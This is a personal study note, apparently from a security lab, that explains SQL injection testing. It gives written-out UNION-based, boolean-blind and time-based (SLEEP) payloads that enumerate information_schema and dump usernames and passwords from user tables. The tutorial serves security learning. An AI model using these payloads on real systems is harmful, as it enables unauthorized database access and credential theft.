---
creation date: January 2nd 2023
last modified date: January 2nd 2023
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: [[SQL]] - [[Injection Attack]]
Search Tag: #📕  

# [[SQLi]]  
___

## Description:  
Structures Query Language injection is when an attacker is able to alter the request a site is making to a database.

## Testing for possible SQLi
1. Adding either of these to the end of a URL: `'` - `"` 
	- `10.10.10.10/about/2'`
	- `10.10.10.10/products/1"`


## Example:
### In-Band SQL Injection
- For this example we have a blog that sets a unique ID for each blog post but it also sets if they are open to public.
	- `https://website.com/blog?id=1`
- When it makes its query to the database it ends up looking something like this:
	- `SELECT * from blog where id=1 and private=0 LIMIT 1;`
- We can try to bypass the restrictions by using the following URL:
	- `https://website.com/blog?id=2;--`
	- This will cause the query to end after it gets to id=2 and comment out everything after due to the **--**
- The new query to the database looks like the following:
	- `SELECT * from blog where id=2;-- and private=0 LIMIT 1;`
	- BUT since we are commenting out everything after the **--** then the query actually only runs this:
	- `SELECT * from blog where id=2;`

### Enumerating SQL Database
**General Tips**
- You can use `UNION ALL SELECT null,null,null`... Shown examples in Section 1 but can be used the same for all commands just need to find correct number of null bytes

1. When it comes to enumerating a database we can do so when its giving us an error message so to start we want to try and get an error message. We can do this by trying `''` or `""`
2. Once we see the type of message we get determines how we can search for database information.
	1. If we an actual message containing information then go to section 1 below
	2. If you see true or false then go to section 2 below
	3. If you aren't seeing either then we can test for timing as we can tell our query to sleep for x amount of time this is explained further in section 3

#### Section 1:
1. We start by trying to figure out how many columns the query needs
	- `1 UNION SELECT 1`
	- `1 UNION SELECT 1,2`
	- `1 UNION SELECT 1,2,3`
	- Keep repeating until the error message doesn't show
	- We can also use **ALL** combined with **null**
		- `1 UNION ALL SELECT null,null,null`
		- Same as above we keep adding **null** this can be used in all expressions
1. Next up if we see a normal article we want to change our initial value so that it doesn't actually reach a legit value
	- `0 UNION SELECT 1,2,3`
2. Now we want to see if we can get the database name we can do this by substituting in **database()**
	- `0 UNION SELECT 1,2,database()`
	- This should return the databases name which is used in the following steps
	- In this case we found **sqli_one**
3. Next we are trying to figure out what tables this database contains
	- `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`
		- `0 UNION ALL SELECT group_concat(table_name),null,null FROM information_schema.tables WHERE table_schema = 'sqli_one'`
		- Alternative this uses null bytes instead so it wont have the 1,2 the spaces will be blank.
	- **group_concat()** - This method is called in order to get the returned values into one string separated by commas
	- **information_schema** - Every user of a database has access to this and it contains information about all the databases and tables the user has access to
	- In this case we found two tables **articles** & **staff_users**
4. This next step is the same as the last except that we are now digging into what does the "staff_users" table contain column wise
	- `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`
		- `0 UNION ALL SELECT group_concat(column_name),null,null FROM information_schema.columns WHERE table_name = 'staff_users'`
		- Alternative this uses null bytes instead so it wont have the 1,2 the spaces will be blank.
	- In this case we found three columns in this table **id** & **password** & **username**
5. Finally we want to pull this information to show us the information contained for each of these columns
	- `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`
		- `0 UNION ALL SELECT null,null,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`
	- **:** - this is placed between username and password so that they will have that separating them instead of a comma to make it easier to read
	- **SEPARATOR '<`br`>'** - The "br" is an HTML tag that forces each result to be on a separate line to make reading easier

#### Section 2:
1. Firstly we want to have the query returning false so we know when we have hit something that is true within the query.
	- `admin123' UNION SELECT 1;--`
	- In this case admin123 gives us a false so the rest of the query is us testing columns
	- We keep adding to it until we are returned with a true
	- `admin123' UNION SELECT 1,2,3;--`
	- In our test example this is what ends up working
2. Now we are going to start the long process of finding the database name
	- `admin123' UNION SELECT 1,2,3 where database() like '%';--`
	- This should return a true because the **%** is a wild card
	- We continue adding letter in front of the **%** until we get the full data base name we will know we got a correct letter when we get a true result
		- i.e. `'sa%'`, `'sb%'`, `'sc%'`, `'sd%'`
		- Eventually we found that **sqli_three** worked for our testing surface
3. Now we rinse and repeat for the tables name in the database
	- `admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--`
	- Keep replacing `'a%'` as we did in the last step until we have a completed table name
	- In this case it was **users**
4.  You guessed it here we rinse and repeat this time for the columns contained inside the users table
	- `admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';`
	- Same as above replace `'a%'` until we get a completed column name since we might find multiple columns the query needs to be adjusted
	- In this case we came across **id** first so we add it to the query so we can keep checking
	- `admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';`
		- See we are telling the query to ignore all matches that are 'id' as we know that is a column we want to know what other columns are in this table
	- We end up finding three columns in this table **id** & **password** & **username**
5. Now this step can be repeated for each column we found in order to extract the information that we can
	- `admin123' UNION SELECT 1,2,3 from users where username like 'a%';'`
	- Cycle through each letter until you get a complete username
	- In this case we found **admin**
6. We can then take the username we find and try to guess its password
	- `admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%';`
	- In this case we found that **3845** was the password for **admin**

#### Section 3:
1. We start of the same as Section 2 except we are adding in `SLEEP(5)` which tells the query to delay for this amount of time and will be our signal that our query was true
	- `admin123' UNION SELECT SLEEP(5);--`
	- Add columns until we get our delay
	- `admin123' UNION SELECT SLEEP(5),2;--`
2. Now do the same as Section 2 except replace the first UNION SELECT with SLEEP(5) to get our 5 second delay as our signal
3. Our test case found **sql__four**
	- `admin123' UNION SELECT SLEEP(2),2 where database() like 'sql__four%';--`
 
___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: January 2nd 2023 (06:19 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
